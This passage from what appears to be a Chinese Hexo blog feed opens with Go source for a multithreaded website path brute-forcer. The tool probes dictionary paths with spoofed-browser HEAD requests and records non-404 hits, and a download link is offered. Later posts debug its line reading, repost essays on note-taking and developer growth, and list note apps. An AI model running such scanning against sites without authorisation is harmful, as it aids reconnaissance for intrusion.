listDic(<span class="string">"dic"</span>)</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		dicPath = <span class="string">"./dic/"</span> + dicPath</div><div class="line">		start(baseURL, dicPath, threadCount)</div><div class="line">		wg.Wait() <span class="comment">//等待goroutine完成</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">start</span><span class="params">(baseURL <span class="keyword">string</span>, dicPath <span class="keyword">string</span>, threadCount <span class="keyword">int</span>)</span></span> &#123;</div><div class="line"></div><div class="line">	dicFile, dicError := os.OpenFile(dicPath, os.O_RDONLY, <span class="number">0</span>)</div><div class="line">	<span class="keyword">if</span> dicError != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Printf(<span class="string">"\nOpenFile Error:文件打开出错，请检查字典文件是否存在，或文件名是否准确\n"</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> dicFile.Close()</div><div class="line"></div><div class="line">	<span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line">	ReturnBurstURL(dicFile, baseURL)</div><div class="line"></div><div class="line">	<span class="comment">//单独开goroutine从信道no404URL取数据写入文件</span></div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		resultTxt, err := os.OpenFile(<span class="string">"result.txt"</span>, os.O_CREATE|os.O_TRUNC|os.O_RDWR, <span class="number">0660</span>)</div><div class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"OpenFile Error:"</span> + err.Error())</div><div class="line">		&#125;</div><div class="line">		resultWriter := bufio.NewWriter(resultTxt)</div><div class="line">		<span class="keyword">defer</span> resultTxt.Close()</div><div class="line">		<span class="keyword">for</span> &#123;</div><div class="line">			_, err = resultWriter.WriteString(&lt;-no404URL)</div><div class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">				fmt.Println(<span class="string">"resultWriter Error:"</span> + err.Error())</div><div class="line">			&#125;</div><div class="line">			resultWriter.Flush()</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line"></div><div class="line">	<span class="comment">//并发访问网址并将状态码不为404的网址加入信道no404URL</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; threadCount; i++ &#123;</div><div class="line">		wg.Add(<span class="number">1</span>)</div><div class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">			<span class="keyword">for</span> <span class="built_in">len</span>(urls) &gt; <span class="number">0</span> &#123;</div><div class="line">				url := &lt;-urls</div><div class="line">				status := HTTPStatus(url)</div><div class="line">				fmt.Printf(<span class="string">"[%d]%s-----%s\n"</span>, i, status, url)</div><div class="line">				<span class="keyword">if</span> status != <span class="string">"404 Not Found"</span> &#123;</div><div class="line">					no404URL &lt;- status + <span class="string">"-----"</span> + url + <span class="string">"\n"</span></div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">			wg.Done()</div><div class="line">		&#125;(i)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//返回HTTP访问状态码</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPStatus</span><span class="params">(url <span class="keyword">string</span>)</span> <span class="params">(status <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	client := http.DefaultClient</div><div class="line">	reqest, err := http.NewRequest(<span class="string">"HEAD"</span>, url, <span class="literal">nil</span>)</div><div class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</div><div class="line">		reqest.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0"</span>)</div><div class="line">		reqest.Header.Set(<span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>)</div><div class="line">		response, err1 := client.Do(reqest)</div><div class="line">		<span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</div><div class="line">			fmt.Println(<span class="string">"HTTPRequest Error:"</span> + err1.Error())</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">defer</span> response.Body.Close()</div><div class="line">		<span class="keyword">return</span> response.Status</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"NewRequest Error:"</span> + err.Error())</div><div class="line">		<span class="keyword">return</span> <span class="string">"400 Bad Request"</span></div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//把处理后的需要爆破的url全部传到信道urls</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> urlList []<span class="keyword">string</span></div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + <span class="string">"/"</span> + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	urls = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="built_in">len</span>(urlList))</div><div class="line">	<span class="keyword">for</span> _, url := <span class="keyword">range</span> urlList &#123;</div><div class="line">		urls &lt;- url</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//罗列出可用字典</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">listDic</span><span class="params">(dicDir <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	dirList, err := ioutil.ReadDir(dicDir)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"ReadDir Error : "</span> + err.Error() + <span class="string">"\n"</span>)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"Dic you can select : "</span>)</div><div class="line">	<span class="keyword">for</span> _, file := <span class="keyword">range</span> dirList &#123;</div><div class="line">		fmt.Printf(<span class="string">"    %s\n"</span>, file.Name())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>只编译了win平台下的，如果有需要可以自行编译</p>
<p><strong><a href="http://pan.baidu.com/s/1c2BYT8k" target="_blank" rel="external">源码及字典及win程序</a></strong><br><strong>密码: g1gd</strong></p>
]]></content>
      
        <categories>
            
            <category> Golang </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Golang </tag>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Golang踩坑录 两种方式来读取文件一行所导致的问题]]></title>
      <url>http://akkuman.coding.me/2017/02/04/Golang%E8%B8%A9%E5%9D%91%E5%BD%95-%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%80%E8%A1%8C%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98.html</url>
      <content type="html"><![CDATA[<p>前两天零零碎碎看完了golang的基础，想着找个小项目练练手，可是出现了一个十分棘手的问题<br>我要做的东西是网站路径爆破<br>所以我会从文本字典中把一行行路径读取然后与域名拼接，但是我在跑起程序后出现了问题</p>
<a id="more"></a>
<p>下面是一个小片段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">400 Bad Request-----http://www.xxx.com/channel.asp</div><div class="line">400 Bad Request-----http://www.xxx.com/index.asp</div><div class="line">404 Not Found-----http://www.xxx.com/admin.asp</div></pre></td></tr></table></figure></p>
<p>程序本身并没有错误，但是运行结果就比较怪了<br>Bad Request?<br>这并不是我要说的重点，我发现的问题是，除了最后一个地址，前面所有的地址都会显示位400 Bad Request<br>经过几轮测试，我觉得应该是网址拼接上出了问题</p>
<p>我的拼接函数是这样<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewReader(fURL)</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		urlpath, readerError := allURLTxt.ReadString(<span class="string">'\n'</span>)</div><div class="line">		newurl := baseurl + strings.Replace(urlpath, <span class="string">"\n"</span>, <span class="string">""</span>, <span class="number">-1</span>)</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">		<span class="keyword">if</span> readerError == io.EOF &#123;</div><div class="line">			fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">			<span class="keyword">return</span> urlList</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我把取一行的方式换成bufio.NewScanner就正常了<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReturnBurstURL</span><span class="params">(fURL *os.File, baseurl <span class="keyword">string</span>)</span> <span class="params">(urlList []<span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	allURLTxt := bufio.NewScanner(fURL)</div><div class="line">	<span class="keyword">for</span> allURLTxt.Scan() &#123;</div><div class="line">		newurl := baseurl + allURLTxt.Text()</div><div class="line">		urlList = <span class="built_in">append</span>(urlList, newurl)</div><div class="line">	&#125;</div><div class="line">	fmt.Printf(<span class="string">"\n读取字典完成，准备开始，请等待...\n"</span>)</div><div class="line">	<span class="keyword">return</span> urlList</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>网上读取文件一行很多人写的文章是第一种方法，但是我也不知道什么问题导致这种情况的发生<br>我特地去查了查api文档<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span></div><div class="line">//<span class="title">NewReader</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Reader</span> <span class="title">whose</span> <span class="title">buffer</span> <span class="title">has</span> <span class="title">the</span> <span class="title">default</span> <span class="title">size</span>. </div><div class="line"><span class="title">func</span> <span class="params">(b *Reader)</span> <span class="title">ReadString</span><span class="params">(delim <span class="keyword">byte</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></div><div class="line">//<span class="title">ReadString</span> <span class="title">reads</span> <span class="title">until</span> <span class="title">the</span> <span class="title">first</span> <span class="title">occurrence</span> <span class="title">of</span> <span class="title">delim</span> <span class="title">in</span> <span class="title">the</span> <span class="title">input</span>, <span class="title">returning</span> <span class="title">a</span> <span class="title">string</span> <span class="title">containing</span> <span class="title">the</span> <span class="title">data</span> <span class="title">up</span> <span class="title">to</span> <span class="title">and</span> <span class="title">including</span> <span class="title">the</span> <span class="title">delimiter</span>. <span class="title">If</span> <span class="title">ReadString</span> <span class="title">encounters</span> <span class="title">an</span> <span class="title">error</span> <span class="title">before</span> <span class="title">finding</span> <span class="title">a</span> <span class="title">delimiter</span>, <span class="title">it</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">data</span> <span class="title">read</span> <span class="title">before</span> <span class="title">the</span> <span class="title">error</span> <span class="title">and</span> <span class="title">the</span> <span class="title">error</span> <span class="title">itself</span> <span class="params">(often io.EOF)</span>. <span class="title">ReadString</span> <span class="title">returns</span> <span class="title">err</span> != <span class="title">nil</span> <span class="title">if</span> <span class="title">and</span> <span class="title">only</span> <span class="title">if</span> <span class="title">the</span> <span class="title">returned</span> <span class="title">data</span> <span class="title">does</span> <span class="title">not</span> <span class="title">end</span> <span class="title">in</span> <span class="title">delim</span>. <span class="title">For</span> <span class="title">simple</span> <span class="title">uses</span>, <span class="title">a</span> <span class="title">Scanner</span> <span class="title">may</span> <span class="title">be</span> <span class="title">more</span> <span class="title">convenient</span>. </div><div class="line"><span class="title">func</span> <span class="title">NewScanner</span><span class="params">(r io.Reader)</span> *<span class="title">Scanner</span></div><div class="line">//<span class="title">NewScanner</span> <span class="title">returns</span> <span class="title">a</span> <span class="title">new</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">read</span> <span class="title">from</span> <span class="title">r</span>. <span class="title">The</span> <span class="title">split</span> <span class="title">function</span> <span class="title">defaults</span> <span class="title">to</span> <span class="title">ScanLines</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Scan</span><span class="params">()</span> <span class="title">bool</span></div><div class="line">//<span class="title">Scan</span> <span class="title">advances</span> <span class="title">the</span> <span class="title">Scanner</span> <span class="title">to</span> <span class="title">the</span> <span class="title">next</span> <span class="title">token</span>, <span class="title">which</span> <span class="title">will</span> <span class="title">then</span> <span class="title">be</span> <span class="title">available</span> <span class="title">through</span> <span class="title">the</span> <span class="title">Bytes</span> <span class="title">or</span> <span class="title">Text</span> <span class="title">method</span>. <span class="title">It</span> <span class="title">returns</span> <span class="title">false</span> <span class="title">when</span> <span class="title">the</span> <span class="title">scan</span> <span class="title">stops</span>, <span class="title">either</span> <span class="title">by</span> <span class="title">reaching</span> <span class="title">the</span> <span class="title">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">input</span> <span class="title">or</span> <span class="title">an</span> <span class="title">error</span>. <span class="title">After</span> <span class="title">Scan</span> <span class="title">returns</span> <span class="title">false</span>, <span class="title">the</span> <span class="title">Err</span> <span class="title">method</span> <span class="title">will</span> <span class="title">return</span> <span class="title">any</span> <span class="title">error</span> <span class="title">that</span> <span class="title">occurred</span> <span class="title">during</span> <span class="title">scanning</span>, <span class="title">except</span> <span class="title">that</span> <span class="title">if</span> <span class="title">it</span> <span class="title">was</span> <span class="title">io</span>.<span class="title">EOF</span>, <span class="title">Err</span> <span class="title">will</span> <span class="title">return</span> <span class="title">nil</span>. <span class="title">Scan</span> <span class="title">panics</span> <span class="title">if</span> <span class="title">the</span> <span class="title">split</span> <span class="title">function</span> <span class="title">returns</span> 100 <span class="title">empty</span> <span class="title">tokens</span> <span class="title">without</span> <span class="title">advancing</span> <span class="title">the</span> <span class="title">input</span>. <span class="title">This</span> <span class="title">is</span> <span class="title">a</span> <span class="title">common</span> <span class="title">error</span> <span class="title">mode</span> <span class="title">for</span> <span class="title">scanners</span>. </div><div class="line"><span class="title">func</span> <span class="params">(s *Scanner)</span> <span class="title">Text</span><span class="params">()</span> <span class="title">string</span></div><div class="line">//<span class="title">Text</span> <span class="title">returns</span> <span class="title">the</span> <span class="title">most</span> <span class="title">recent</span> <span class="title">token</span> <span class="title">generated</span> <span class="title">by</span> <span class="title">a</span> <span class="title">call</span> <span class="title">to</span> <span class="title">Scan</span> <span class="title">as</span> <span class="title">a</span> <span class="title">newly</span> <span class="title">allocated</span> <span class="title">string</span> <span class="title">holding</span> <span class="title">its</span> <span class="title">bytes</span>.</div></pre></td></tr></table></figure></p>
<p>按照上面的api文档，这两个的区别就是两者在返回string的时候，一个是数据+分隔符，一个是一行的数据，不带分隔符<br>虽说我第一种方法也用strings.Replace方法把”\n”替换成了””空字符，但是可能还是有点奇奇怪怪的东西</p>
<p><em>转载请注明出处</em></p>
]]></content>
      
        <categories>
            
            <category> Golang </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 问题解决 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[笔记带给我们是真实的知识增长么？你需要好好考虑了]]></title>
      <url>http://akkuman.coding.me/2017/01/21/%E7%AC%94%E8%AE%B0%E5%B8%A6%E7%BB%99%E6%88%91%E4%BB%AC%E6%98%AF%E7%9C%9F%E5%AE%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E5%A2%9E%E9%95%BF%E4%B9%88%EF%BC%9F%E4%BD%A0%E9%9C%80%E8%A6%81%E5%A5%BD%E5%A5%BD%E8%80%83%E8%99%91%E4%BA%86.html</url>
      <content type="html"><![CDATA[<p>我有段时间疯狂使用各类笔记软件，相信什么云记忆，第二大脑之类的说法。后来发现，没啥意义。记多了根本看不完，你在当时没时间看的，过后更没时间看。笔记唯一剩下的作用就是检索，但是你没看过的内容，你又怎么知道要检索啥呢？而且，自己维护的资料库，怎么也没办法跟google的检索比。善用google的搜索规则，比浪费时间剪藏保存一大堆网页有效得多。<br><a id="more"></a><br>其实滥用或者过分依赖这些笔记软件，最大的坏处是产生了知识增长的错觉。剪藏一篇机器学习的长文，就以为自己的知识增长了，其实只扫了一眼前言。 下载了一系列新框架的开发教程，三分钟热度把开发环境搭建完，跟着第一章跑了个hello world就弃坑了，但还是在欺骗自己，觉得自己已经掌握了，最不济那些教程已经被我收到硬盘里了，要用的时候再翻出来学嘛。而且，这种廉价的获得知识的错觉，带来的成就感比真的花时间去学习还要强，甚至会形成“要开工了-&gt;先了解下业界动态，去各大论坛微博逛一圈-&gt;哇，又有这么多新教程/技巧/开源库，看不过来，先保存到笔记软件 -&gt; 啊，不知不觉居然花了一个小时，不过我又不是打游戏看电影，是在收集知识，对自己还是有帮助的，不算虚度时光吧 -&gt; 继续开工，嗯？这个问题好像看到过更好的解决办法，要不要试着优化下？算了算了，反正办法在笔记里存着，以后有时间再重构吧 -&gt;…”</p>
<p>那几个月里我一直就陷在这样的循环里，同时还沾沾自喜于自己的“努力”而不自觉。直到某天，有个面试者坐到我面前时，我惊讶于他面谈时对各类业界动态新框架新技术口若悬河，但是实际的笔试题目却做得惨不忍睹，有些基础概念题都直接留白。我试探性地问了下原因，结果他特别诚恳地看着我说，这些问题的答案都存在他包里的笔记本电脑里，只要他想，分分钟就能搜出来。</p>
<p>当时我下意识地反问了一句：“那谁不会啊？”</p>
<p>说完我自己都惊了一下。</p>
<p>那天之后，我很少再去碰那些笔记软件了。第二大脑什么的都是骗人的，在我得老年痴呆之前，应该不会特别依赖它们。曾经我一个月要从各大技术论坛微博twitter上收集几十篇教程，上百篇技术长文，真正看完的，不到五篇。之后我发现，把产生这些知识的源头掐掉，统统加到127.0.0.1里去，节省下的时间认认真真读几本经典纸质书，跟着官方文档走一遍教程，不收集，多动手多思考，技术长进比之前快得多。实际做项目的时候碰到解决不了的问题怎么办？直接开google去搜呗。根本没必要去浪费时间维护一个私人的知识库。</p>
<p>在人类数千年漫长的文明史中，收藏本来是一件相当奢侈，大量耗费金钱、时间、精力的事情。但到了互联网的时代，这一切被简化成了点点鼠标就能完成的美事。或许因为盗版盛行的原因，它几乎已经是免费的，但它对于个体时间精力的耗费，却始终没有变化。而且，躺在硬盘里的资源们，就像王阳明的花一样，你未看它时，它与你同归于寂，一点关系都没有。</p>
<p>《银河英雄传说》里杨威利说过一句名言：“如果你不记得了，那说明它不重要。” 或许可以再补充一句，“如果你看不完，那就没必要看完。” 大概就是这样，不知不觉写了这么多，与所有现在或曾经的互联网资源收集成瘾症患者共勉。</p>
<p><strong>转自<a href="https://www.v2ex.com/amp/t/191507" target="_blank" rel="external">V2EX</a>一位v友的回答</strong></p>
]]></content>
      
        <categories>
            
            <category> 生活 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PKM（个人知识管理）类软件收集(偶尔更新列表)]]></title>
      <url>http://akkuman.coding.me/2017/01/21/PKM%EF%BC%88%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E7%AE%A1%E7%90%86%EF%BC%89%E7%B1%BB%E8%BD%AF%E4%BB%B6-%E5%81%B6%E5%B0%94%E6%9B%B4%E6%96%B0%E5%88%97%E8%A1%A8.html</url>
      <content type="html"><![CDATA[<p>evernote(印象笔记)</p>
<p>Wiz<br><a id="more"></a><br>有道云</p>
<p>麦库</p>
<p>leanote</p>
<p>GoogleKeep</p>
<p>OneNote</p>
<p>SimpleNote(wp家的，免费)</p>
<p>pocket(稍后读的软件，同类的还有Instapaper，国内的收趣)</p>
<p>MyBase</p>
<p>RaysNote(v友开发)</p>
<p>CintaNotes</p>
<p><a href="https://jitaku.io" target="_blank" rel="external">https://jitaku.io</a></p>
<p><strong>开源</strong></p>
<p>Gitit-Bigger</p>
<p>Laverna</p>
<p>paperwork</p>
<p>DokuWiki</p>
<p>leanote</p>
<p>PermaNote</p>
<p>CherryTree</p>
<p>BrainStorm</p>
]]></content>
      
        <categories>
            
            <category> 推荐向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 推荐向 </tag>
            
            <tag> 软件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web高级开发的成长之路]]></title>
      <url>http://akkuman.coding.me/2017/01/20/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html</url>
      <content type="html"><![CDATA[<p>读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。</p>
<p><strong>正文如下：</strong><br><a id="more"></a><br>本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？</p>
<p>　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。</p>
<p>　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……</p>
<p>　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。</p>
<p>　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。</p>
<p>　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。</p>
<p>　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。</p>
<p>　　写代码要经历下面几个阶段。</p>
<p>　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！</p>
<p>　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？</p>
<p>　　面向对象的目的是什么？</p>
<p>　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：</p>
<p>　　1. 降低软件开发的复杂度</p>
<p>　　2. 提高软件开发的效率</p>
<p>　　3. 提高软件质量：可维护性，可扩展性，可重用性等。</p>
<p>　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。</p>
<p>　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。</p>
<p>　　二、 要想学好面向对象，就必须学习设计模式。</p>
<p>　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。</p>
<p>　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。</p>
<p>　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。</p>
<p>　　三、学习设计模式</p>
<p>　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。</p>
<p>　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。</p>
<p>　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。</p>
<p>　　四、学习重构</p>
<p>　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？</p>
<p>　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。</p>
<p>　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。</p>
<p>　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。</p>
<p>　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。</p>
<p>　　五、开始通往优秀软件设计师的路上</p>
<p>　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。</p>
<p>　　这本书正是我们需要的教练，值得一读。</p>
<p>　　六、没有终点，只有坚持不懈的专研和努力。</p>
<p>　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。</p>
<p>　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。</p>
<p><strong>转自<a href="http://www.cnblogs.com/leefan/p/5489984.html" target="_blank" rel="external">李凡的博客</a></strong></p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo在github和coding.net部署并分流（一）]]></title>
